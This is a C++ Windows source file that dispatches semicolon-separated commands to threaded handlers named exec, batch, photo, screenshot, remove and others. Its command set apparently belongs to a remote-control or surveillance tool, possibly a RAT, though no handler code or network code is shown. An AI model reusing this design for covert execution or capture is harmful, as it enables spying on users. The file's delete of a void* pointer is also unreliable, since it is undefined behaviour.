#include "stdafx.h"
#include "CommandExe.h"

#include "Settings.h"
#include "Logger.h"
#include "Util.h"

#include "Command.h"
#include "Command_batch.h"
#include "Command_exec.h"
#include "Command_exit.h"
#include "Command_info.h"
#include "Command_msgbox.h"
#include "Command_remove.h"
#include "Command_photo.h"
#include "Command_screenshot.h"

struct CommandThreadParams
{
	std::vector<std::wstring> args;
};

static Command *CreateCommandFromName(const std::wstring &name)
{
	if(name == L"batch")
		return new Command_batch();
	else if(name == L"exec")
		return new Command_exec();
	else if(name == L"exit")
		return new Command_exit();
	else if(name == L"info")
		return new Command_info();
	else if(name == L"msgbox")
		return new Command_msgbox();
	else if (name == L"photo")
		return new Command_photo();
	else if (name == L"remove")
		return new Command_remove();
	else if(name == L"screenshot")
		return new Command_screenshot();
	else
		return NULL;
}

static DWORD WINAPI ExecuteCommand(LPVOID param)
{
	CommandThreadParams *cmdParams = (CommandThreadParams *)param;
	DWORD ret = 0;

	Command *command = CreateCommandFromName(cmdParams->args[0]);
	if (command) {
		VLog(LMESSAGE, cmdParams->args[0]);
		ret = command->OnExecute(cmdParams->args);
		delete command;
	}

	delete param;
	return ret;
}

CommandExe::CommandExe()
{

}

CommandExe::~CommandExe()
{

}

void CommandExe::Run(const std::wstring& cmds)
{
	if (cmds.size() == 0) {
		return;
	}

	std::vector<std::wstring> commands = Util::split(cmds, ';');
	for (auto &cmd : commands) {
		std::vector<std::wstring> args = Util::split(cmd, ' ');
		args.erase(std::remove_if(args.begin(), args.end(), [&](const std::wstring &s) { return std::all_of(s.begin(), s.end(), iswspace); }), args.end());
		if (args.size()) {
			CommandThreadParams *params = new CommandThreadParams();
			params->args = args;

			CreateThread(NULL, 0, ExecuteCommand, params, 0, NULL);
		}
	}
}